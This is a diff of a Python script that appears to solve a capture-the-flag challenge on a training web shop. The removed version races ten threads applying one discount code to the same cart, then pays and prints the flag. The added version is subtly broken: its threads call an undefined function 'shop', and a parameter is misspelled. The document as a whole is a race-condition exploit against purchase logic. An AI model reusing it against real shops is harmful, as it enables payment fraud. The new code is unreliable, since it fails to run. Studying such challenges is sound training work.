@@ -5,7 +5,7 @@ import re
 import threading
 import time
 
-url = "http://discount.training.offdef.it/"
+url = "http://discount.training.offdef.it"
 
 def find_flag(data):
 	search = re.search("flag{[a-zA-Z1-9_!?]+}", data)
@@ -20,54 +20,36 @@ def find_discount_code(data):
 def gen_ran_string(size=25):
 	return "".join(random.choice(string.ascii_letters) for _ in range(size))
 
-def register(u, p):
+def register(s, u, p):
 	data = {"username": u, "password": p}
-	return requests.post(url+"/register", data=data)
+	return s.post(url+"/register", data=data)
 
-def login(username, password):
-	payload = {'username' : username, 'password' : password}
-	r = requests.post(url+"/login", data=payload)
-	return r.cookies['session']
+def add_to_cart(s, item_id):
+	params = {"item_id": item_id}
+	return s.get(url+"/add_to_cart", params=params)
 
-def add_to_cart(s):
-	cookies = {"session": s}
-	return requests.get(url+"/add_to_cart?item_id=21", cookies=cookies)
+def apply_discount(s, discont_code):
+	data = {"discount": discount_code}
+	return s.post(url+"/apply_discount", data=data)
 
 def cart(s):
-	cookies = {"session": s}
-	return requests.get(url+"/cart", cookies=cookies)
+	return s.get(url+"/cart")
 
-def apply_discount(s, discount_code):
-	data = {"discount": discount_code}
-	cookies = {"session": s}
-	return requests.post(url+"/apply_discount", data=data, cookies=cookies)
+u = gen_ran_string(size=10)
+p = gen_ran_string(size=10)
+s = requests.Session()
+r = register(s, u, p)
+discount_code = find_discount_code(r.text)
+add_to_cart(s, 21)
 
-def pay(s):
-	cookies = {"session": s}
-	return requests.get(url+"/cart/pay", cookies=cookies)
+threads = []
+for i in range(10):
+	threads.append(threading.Thread(target=shop, args=(s, )))
 
-def items(s):
-	cookies = {"session": s}
-	return requests.get(url+"/items", cookies=cookies)
+for i in range(10):
+	threads[i].start()
 
-while True:
-	u = gen_ran_string(size=50)
-	p = gen_ran_string(size=50)		# big user
-	r = register(u, p)				# register
-	if "shop" in r.url:
-		discount_code = find_discount_code(r.text)
-		s = login(u, p)
-		add_to_cart(s)
-		
-		threads=[]	
-		for i in range(10):
-			threads.append(threading.Thread(target=apply_discount, args=(s, discount_code)))
-		
-		for i in range(10):	
-			threads[i].start()
-		
-		for i in range(10):
-			threads[i].join()
-		pay(s)
-		print(find_flag(items(s).text))
+for i in range(10):
+	threads[i].join()
 
+print(cart(s).text)
